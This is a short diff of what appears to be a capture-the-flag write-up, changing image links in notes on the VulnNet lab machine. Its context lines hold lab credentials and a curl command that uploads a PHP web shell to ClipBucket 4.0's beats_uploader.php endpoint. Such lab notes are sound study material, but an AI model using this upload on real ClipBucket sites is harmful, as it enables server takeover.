@@ -53,12 +53,13 @@ developers:9972761drmfsls
 Credentials work on `http://broadcast.vulnnet.thm`  
 Version: ClipBucket 4.0
 ```
-![[Pasted image 20260314183105.png]]
+![ClipBucket Login](Pasted%20image%2020260314183105.png)
 
 **Exploiting ClipBucket
 
 looking on searchsploit
-![[Pasted image 20260314183517.png]]
+
+![Searchsploit](Pasted%20image%2020260314183517.png)
 ```
 curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
 ```
